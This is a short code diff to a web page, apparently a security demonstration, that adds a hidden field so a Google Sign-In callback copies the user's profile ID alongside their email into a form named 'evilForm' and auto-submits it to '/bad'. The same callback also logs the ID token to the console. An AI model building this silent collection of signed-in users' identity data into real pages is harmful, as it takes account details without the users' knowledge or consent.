@@ -60,12 +60,14 @@
         console.log("ID Token: " + id_token);
 
         $("#youremail").val(profile.getEmail());
+        $("#yourID").val(profile.getId());
         document.forms["evilForm"].submit();
 
           };
     </script>
     <form action="/bad" method="post" name="evilForm" id="evilForm">
       <input type="hidden" name="youremail" id="youremail"></input>
+      <input type="hidden" name="yourID" id="yourID"></input>
     </form>
         
       </ul>
